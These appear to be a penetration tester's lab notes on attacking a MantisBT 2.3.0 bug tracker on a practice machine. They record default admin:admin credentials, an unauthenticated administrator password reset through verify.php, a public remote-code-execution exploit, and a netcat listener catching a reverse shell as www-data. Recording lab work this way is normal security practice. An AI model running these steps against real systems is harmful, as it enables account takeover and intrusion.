# 3 :80 mantis bug tracker

```
solmusic.com/system
admin:admin
> /login_page.php

# all exploits are authenticated
# no sqli auth bypass
Found https://www.exploit-db.com/exploits/41890

http://solmusic.com/system/verify.php?id=1&confirm_hash=
Your account information has been verified.
You must set a password here to allow you to log in again.
Edit Account - administrator

# setting new password: kashz
# successful

# logging in using administrator:kashz

Manage > (Help icon)
http://solmusic.com/system/manage_overview_page.php
MantisBT Version 	2.3.0
Site Path 	/var/www/html/system/
Core Path 	/var/www/html/system/core/
Plugin Path 	/var/www/html/system/plugins/

Using https://www.exploit-db.com/exploits/48818
# need to sumit header Authorization as we have an initial login admin:admin
# self.headers = {'Authorization': 'Basic YWRtaW46YWRtaW4='}

$ nc -lvnp 7070
listening on [any] 7070 ...
connect to [192.168.49.214] from (UNKNOWN) [192.168.214.84] 49030
bash: cannot set terminal process group (574): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tre:/var/www/html/system$ whoami;id;hostname
whoami;id;hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
tre
```
